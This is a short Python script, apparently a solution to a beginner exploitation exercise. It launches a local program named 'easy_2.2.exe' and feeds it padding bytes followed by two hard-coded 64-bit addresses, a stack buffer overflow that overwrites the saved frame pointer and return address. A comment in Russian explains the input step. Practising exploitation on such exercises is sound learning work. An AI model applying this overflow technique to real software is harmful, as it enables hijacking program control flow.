import struct
import subprocess

exe_path = 'easy_2.2.exe'

input_string = b"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" + b"\x00\x40\x00\x40\x01\x00\x00\x00" + b"aaaaaaaa" + b"\x58\x21\x00\x40\x01\x00\x00\x00"

process = subprocess.Popen(
exe_path,
stdin=subprocess.PIPE
)

# Передаем строку в стандартный ввод
stdout, stderr = process.communicate(input=input_string)